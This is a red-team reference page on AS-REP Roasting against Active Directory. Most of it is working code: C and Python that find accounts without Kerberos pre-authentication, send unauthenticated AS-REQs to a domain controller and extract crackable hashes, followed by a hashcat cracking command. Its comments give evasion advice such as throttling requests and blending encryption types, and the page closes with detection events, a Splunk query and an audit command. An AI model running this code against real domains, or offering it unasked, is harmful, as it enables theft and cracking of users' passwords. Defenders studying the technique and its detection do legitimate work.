# AS-REP Roasting

**MITRE ATT&CK**: [T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

AS-REP Roasting targets AD accounts with Kerberos pre-authentication disabled
(`DONT_REQ_PREAUTH` / UAC bit 0x400000). Without pre-auth, an attacker sends an
AS-REQ for the target user **without knowing their password**, and the KDC returns
an AS-REP with data encrypted using the user's key -- crackable offline.

Unlike Kerberoasting, AS-REP Roasting needs **no domain authentication** (only
usernames). However, the vulnerable account pool is typically small since
`DONT_REQ_PREAUTH` is not a default setting.

## Pre-Authentication: Normal vs Disabled

```
 Normal AS Exchange (pre-auth required):         AS-REP Roasting (pre-auth off):
 ========================================        ================================
 Client                       KDC                Attacker (unauthed)      KDC
   |  AS-REQ (no pre-auth)     |                    |  AS-REQ for target   |
   |-------------------------->|                    |--------------------->|
   |  KRB_ERROR: PREAUTH_REQ   |                    |  No identity check!  |
   |<--------------------------|                    |  AS-REP              |
   |  AS-REQ + PA-ENC-TIMESTAMP|                    |  enc-part = user key |
   |  (timestamp enc w/ key)   |                    |<---------------------|
   |-------------------------->|                    |                      |
   |  AS-REP (TGT + enc-part) |                    |  Extract -> crack    |
   |<--------------------------|
```

## AS-REP Structure

```
AS-REP ::= {
    pvno      INTEGER (5),
    msg-type  INTEGER (11),              -- KRB_AS_REP
    ticket    Ticket { ... },            -- TGT (encrypted with krbtgt key)
    enc-part  EncryptedData {
        etype   INTEGER,                 -- 23 = RC4, 18 = AES256
        cipher  OCTET STRING             -- encrypted with USER's key -- we crack this
    }
}
```

## Comparison: AS-REP Roasting vs Kerberoasting

| Property | AS-REP Roasting | Kerberoasting |
|---|---|---|
| Auth required | No | Yes (any domain user) |
| Target requirement | DONT_REQ_PREAUTH flag | Account must have SPN |
| Typical target count | Few (uncommon flag) | Many (service accounts) |
| What we crack | AS-REP enc-part (user key) | TGS ticket enc-part (service key) |
| Hashcat mode (RC4) | 18200 | 13100 |
| Detection event | 4768 (AS) | 4769 (TGS) |

## LDAP Enumeration: Finding Vulnerable Accounts (C)

```c
/*
 * DETECTION: The LDAP filter OID 1.2.840.113556.1.4.803:=4194304 is distinctive.
 * Few legitimate tools query this exact flag -- it stands out in LDAP audit logs.
 * OPSEC: If you have a username list, skip LDAP entirely. AS-REQ needs no auth.
 */
#include <windows.h>
#include <winldap.h>
#include <stdio.h>
#pragma comment(lib, "wldap32.lib")

/* DONT_REQUIRE_PREAUTH = 0x400000 (4194304)
 * Matching rule 1.2.840.113556.1.4.803 = bitwise AND */
#define ASREP_FILTER L"(&(objectCategory=person)(objectClass=user)" \
                     L"(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

int enumerate_asrep_targets(const wchar_t *dc, const wchar_t *base_dn) {
    LDAP *ld = NULL;
    LDAPMessage *result = NULL, *entry = NULL;
    PWCHAR attrs[] = { L"samAccountName", L"userAccountControl", NULL };

    ld = ldap_sslinit((PWCHAR)dc, LDAP_SSL_PORT, 1);
    if (!ld) return -1;

    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        ldap_unbind(ld); return -1;
    }

    /* DETECTION: This query is highly specific and rarely used legitimately */
    if (ldap_search_s(ld, (PWCHAR)base_dn, LDAP_SCOPE_SUBTREE,
                      ASREP_FILTER, attrs, 0, &result) != LDAP_SUCCESS) {
        ldap_unbind(ld); return -1;
    }

    ULONG count = ldap_count_entries(ld, result);
    wprintf(L"[+] Found %lu accounts without pre-auth\n", count);

    for (entry = ldap_first_entry(ld, result); entry;
         entry = ldap_next_entry(ld, entry)) {
        PWCHAR *vals = ldap_get_values(ld, entry, L"samAccountName");
        if (vals && vals[0]) { wprintf(L"  Target: %s\n", vals[0]); ldap_value_free(vals); }
    }
    ldap_msgfree(result);
    ldap_unbind(ld);
    return count;
}
```

## AS-REQ Construction Without Pre-Auth (C Pseudocode)

```c
/*
 * DETECTION: Event 4768 with Pre-Authentication Type = 0.
 *   Normal: type 2 (PA-ENC-TIMESTAMP) or 15 (PA-PK-AS-REQ).
 * OPSEC: No domain creds needed. Can run from outside domain network.
 *   Each request = one 4768 event. Throttle to avoid volume detection.
 *
 * ASN.1 structure (pa-data ABSENT -- no pre-authentication):
 * AS-REQ ::= {
 *     pvno       INTEGER (5),
 *     msg-type   INTEGER (10),           -- KRB_AS_REQ
 *     req-body   KDC-REQ-BODY {
 *         kdc-options   KDCOptions,      -- forwardable, renewable
 *         cname         PrincipalName,   -- target username
 *         realm         REALM,
 *         sname         PrincipalName,   -- krbtgt/REALM
 *         till          KerberosTime,
 *         nonce         UInt32,
 *         etype         SEQUENCE OF Int32  -- [23] RC4 or [18,17,23] to blend
 *     }
 * }
 *
 * Flow: Build body -> send to DC:88 -> parse AS-REP -> extract enc-part -> hashcat 18200
 * OPSEC on etype: requesting only 23 (RC4) is a downgrade indicator.
 * Requesting [18,17,23] looks more normal but KDC returns whatever account supports.
 */
```

## Python: AS-REP Roasting Flow

```python
"""
DETECTION: Event 4768 with Pre-Auth Type 0; multiple from same IP; Result Code 0x0
  for accounts that should require pre-auth. Username spray = 0x6 (principal unknown).
OPSEC: No domain creds needed. Can run from non-domain-joined host. Throttle requests.
"""
import socket, struct, datetime, time
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import encoder, decoder

def find_no_preauth_accounts(dc_ip, domain, username, password):
    """DETECTION: OID 1.2.840.113556.1.4.803 with 4194304 is a known indicator.
    OPSEC: Skip this if you have usernames from OSINT/prior compromise."""
    import ldap3
    server = ldap3.Server(dc_ip, port=636, use_ssl=True)
    conn = ldap3.Connection(server, user=f"{domain}\\{username}",
                            password=password, authentication=ldap3.NTLM)
    conn.bind()
    conn.search(
        search_base=f"DC={domain.replace('.', ',DC=')}",
        search_filter="(&(objectCategory=person)(objectClass=user)"
                      "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        attributes=["samAccountName"])
    targets = [str(e.samAccountName) for e in conn.entries]
    conn.unbind()
    return targets

def send_asreq_no_preauth(dc_ip, username, domain):
    """DETECTION: Event 4768 Pre-Auth Type=0. Result 0x0=vulnerable, 0x19=not.
    OPSEC: 0x19 means account requires pre-auth (not vulnerable) but IS logged."""
    as_req = AS_REQ()
    as_req["pvno"] = 5
    as_req["msg-type"] = 10  # KRB_AS_REQ
    req_body = as_req["req-body"]
    req_body["kdc-options"] = constants.encodeFlags(
        [constants.KDCOptions.forwardable.value,
         constants.KDCOptions.renewable.value,
         constants.KDCOptions.canonicalize.value])
    seq_set(req_body, "cname",
            Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            .components_to_asn1)
    req_body["realm"] = domain.upper()
    seq_set(req_body, "sname",
            Principal(f"krbtgt/{domain.upper()}",
                      type=constants.PrincipalNameType.NT_SRV_INST.value)
            .components_to_asn1)
    req_body["till"] = KerberosTime.to_asn1(datetime.datetime(2037, 12, 31, 23, 59, 59))
    req_body["nonce"] = 12345678
    # OPSEC: [23] = RC4 only (fast crack, downgrade signal)
    # [18,17,23] = looks more normal but KDC returns what account supports
    seq_set(req_body, "etype", [23])

    encoded = encoder.encode(as_req)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((dc_ip, 88))
    sock.send(struct.pack(">I", len(encoded)) + encoded)
    resp_len = struct.unpack(">I", sock.recv(4))[0]
    resp_data = b""
    while len(resp_data) < resp_len:
        resp_data += sock.recv(4096)
    sock.close()
    return resp_data

def extract_asrep_hash(resp_data, username, domain):
    """Local parsing only -- no additional detection events."""
    as_rep, _ = decoder.decode(resp_data, asn1Spec=AS_REP())
    if int(as_rep["msg-type"]) != 11:
        return None  # KRB_ERROR (pre-auth required)
    enc_part = as_rep["enc-part"]
    etype = int(enc_part["etype"])
    cipher = bytes(enc_part["cipher"])
    if etype == 23:  # RC4: hashcat mode 18200
        return f"$krb5asrep$23${username}@{domain.upper()}:{cipher[:16].hex()}${cipher[16:].hex()}"
    elif etype == 18:  # AES256
        return f"$krb5asrep$18${username}@{domain.upper()}:{cipher[-12:].hex()}${cipher[:-12].hex()}"
    return None

def asrep_roast(dc_ip, domain, usernames):
    """No domain credentials required. Only needs: DC IP, domain, usernames."""
    hashes = []
    for user in usernames:
        time.sleep(2)  # OPSEC: throttle to avoid burst detection
        try:
            resp = send_asreq_no_preauth(dc_ip, user, domain)
            h = extract_asrep_hash(resp, user, domain)
            if h:
                hashes.append(h)
                print(f"[+] {user} -- no pre-auth! Hash extracted.")
            else:
                print(f"[-] {user} -- pre-auth required (not vulnerable)")
        except Exception as e:
            print(f"[-] {user} -- error: {e}")
    return hashes
```

## Hashcat Cracking Reference

```
hashcat -m 18200 -a 0 asrep_hashes.txt wordlist.txt -r rules/best64.rule
# Format: $krb5asrep$23$jsmith@CORP.LOCAL:checksum$edata2
```

## Detection Indicators

| Indicator | Source | Details |
|---|---|---|
| Event 4768 | Security log (DC) | Pre-Authentication Type = 0 |
| Pre-auth anomaly | Event 4768 | Type 0 for accounts that should require pre-auth |
| Volume anomaly | Event 4768 | Multiple 4768 with type 0 from same Client Address |
| Username spray | Event 4768 | Multiple 4768 with Result Code 0x6 (principal unknown) |
| LDAP enum pattern | LDAP audit | `userAccountControl:1.2.840.113556.1.4.803:=4194304` |
| Network signature | IDS/NDR | AS-REQ without PA-DATA from non-standard source |

```
index=wineventlog EventCode=4768 Pre_Authentication_Type=0
| stats count by Client_Address, Account_Name | where count > 1
```

**Proactive defense**: Audit and remove `DONT_REQ_PREAUTH` where not strictly needed:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

## Cross-References

- [Kerberos Attacks Narrative](../../12-active-directory-deep-dive/kerberos-attacks.md) -- protocol-level context
- [Kerberoasting Implementation](kerberoasting-implementation.md) -- related technique with higher target count
- [Credential Access Overview](../../12-active-directory-deep-dive/credential-access.md) -- broader credential theft context
